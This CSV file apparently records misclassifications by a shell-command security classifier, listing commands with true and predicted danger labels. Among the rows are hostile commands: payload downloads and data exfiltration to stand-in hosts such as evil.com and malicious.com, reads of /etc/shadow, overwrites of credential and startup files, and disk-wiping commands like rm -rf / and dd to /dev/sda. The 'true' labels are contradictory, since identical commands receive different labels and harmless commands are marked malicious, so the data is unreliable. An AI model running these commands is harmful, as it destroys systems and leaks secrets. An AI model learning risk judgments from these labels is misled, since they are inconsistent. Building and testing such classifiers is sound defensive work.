command,true_label,predicted_label
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
GREP   'PASSWORD' /ETC/PASSWD,MALICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
scp data.tar.gz admin@malicious.com:/var/www,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
WHOAMI,SUSPICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
echo   'hello',SUSPICIOUS,BENIGN
cat   welcome.txt,SUSPICIOUS,MALICIOUS
cat /root/.bashrc,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
scp data.tar.gz root@malicious.com:/tmp/,MALICIOUS,BENIGN
env,BENIGN,SUSPICIOUS
echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
sudo apt install nmap ,BENIGN,MALICIOUS
wget   http://evil.com/update.bin,SUSPICIOUS,BENIGN
top -n 1,BENIGN,SUSPICIOUS
wget http://suspicious.org/update.bin,BENIGN,MALICIOUS
wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
curl -O http://evil.com/exploit.zip,MALICIOUS,BENIGN
cd /root/,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
WGET HTTP://EVIL.COM/PAYLOAD.SH ,MALICIOUS,BENIGN
ping   google.com,MALICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,MALICIOUS
cat   /etc/shadow,SUSPICIOUS,BENIGN
echo   'hacked' > /root/.bashrc,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
PING GOOGLE.COM ,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
which   python,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh ,MALICIOUS,BENIGN
 DF -H,MALICIOUS,BENIGN
echo 'hello world',MALICIOUS,SUSPICIOUS
sudo -l,MALICIOUS,BENIGN
WGET HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
CAT /ROOT/.BASHRC ,BENIGN,MALICIOUS
sudo apt update,MALICIOUS,BENIGN
sudo apt install   net-tools,BENIGN,MALICIOUS
dd if=/dev/zero of=/dev/sda ,SUSPICIOUS,BENIGN
echo 'hacked' >> /etc/shadow,MALICIOUS,BENIGN
cat   /etc/shadow,MALICIOUS,BENIGN
env,BENIGN,SUSPICIOUS
sudo apt update,SUSPICIOUS,BENIGN
echo 'owned' > /etc/shadow,MALICIOUS,BENIGN
find / -name 'test',BENIGN,MALICIOUS
cat homework.txt,MALICIOUS,SUSPICIOUS
 echo 'hacked' > /var/log/syslog,BENIGN,MALICIOUS
cat .bashrc,SUSPICIOUS,MALICIOUS
LS   /TMP/,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
echo 'malware'   > /tmp/malware.sh,MALICIOUS,BENIGN
cd /tmp/,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
scp data.tar.gz admin@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
echo 'owned' > /etc/shadow,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
uname -a,BENIGN,MALICIOUS
echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
 sudo apt install htop,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow ,MALICIOUS,BENIGN
